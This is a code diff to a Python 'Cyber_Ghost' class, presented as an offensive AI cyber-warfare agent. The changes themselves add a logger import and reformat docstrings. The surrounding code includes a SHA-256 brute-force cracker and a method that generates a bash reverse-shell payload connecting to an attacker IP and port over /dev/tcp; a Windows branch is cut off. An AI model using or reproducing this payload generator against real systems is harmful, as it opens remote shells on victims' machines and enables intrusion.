@@ -1,3 +1,4 @@
+from src.telemetry import logger
 import hashlib
 import time
 
@@ -5,9 +6,7 @@ class Cyber_Ghost:
     """Agent specialized in Offensive AI Cyber Warfare, Encryption Breaking, and Threat Simulation."""
     
     def simulate_brute_force_crack(self, target_hash: str, max_attempts: int = 10000):
-        """
-        Executes a real programmatic dictionary and permutation attack on a SHA-256 hash.
-        """
+        """Executes a real programmatic dictionary and permutation attack on a SHA-256 hash."""
         import itertools
         import string
         
@@ -34,9 +33,7 @@ class Cyber_Ghost:
         return {"status": "FAILED", "reason": "Hash requires deeper combinatorial search space."}
 
     def generate_zero_day_payload(self, target_os: str, vulnerability_type: str, attacker_ip: str = "127.0.0.1", port: int = 4444):
-        """
-        Generates an actual functional reverse-shell payload string based on target OS.
-        """
+        """Generates an actual functional reverse-shell payload string based on target OS."""
         if target_os.lower() == "linux":
             payload = f"bash -i >& /dev/tcp/{attacker_ip}/{port} 0>&1"
         elif target_os.lower() == "windows":
